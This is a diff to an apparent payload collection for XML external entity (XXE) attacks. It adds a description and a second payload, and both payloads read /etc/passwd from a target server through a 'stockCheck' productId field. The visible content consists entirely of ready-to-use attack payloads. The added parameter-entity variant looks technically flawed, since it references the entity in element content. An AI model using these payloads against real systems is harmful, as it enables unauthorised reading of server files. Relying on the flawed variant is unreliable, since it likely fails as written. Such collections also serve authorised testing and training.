@@ -1,5 +1,5 @@
 name: XXE LFI
-description:
+description: LFI payloads for XXE with custom and parameter entities.
 commands:
   - command: |
       <?xml version="1.0" encoding="UTF-8"?> 
@@ -7,7 +7,14 @@ commands:
       <stockCheck>
           <productId>&xxe;</productId>
       </stockCheck>
-    description: LFI with inline XXE
+    description: LFI with custom entities
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?> 
+      <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> ]> 
+      <stockCheck>
+          <productId>%xxe;</productId>
+      </stockCheck>
+    description: LFI with parameter entities
   - command: |
       <?xml version="1.0" encoding="UTF-8"?> 
       <@hex_entities>
